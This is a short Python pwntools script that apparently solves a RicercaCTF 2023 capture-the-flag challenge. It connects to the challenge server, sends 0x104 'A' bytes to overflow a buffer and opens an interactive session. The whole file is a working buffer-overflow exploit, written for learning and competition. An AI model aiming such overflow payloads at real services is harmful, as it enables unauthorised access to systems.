from pwn import *

# p = process('./chall')
p = remote('bofsec.2023.ricercactf.com', 9001)

p.sendline(b'A' * 0x104)
p.interactive()

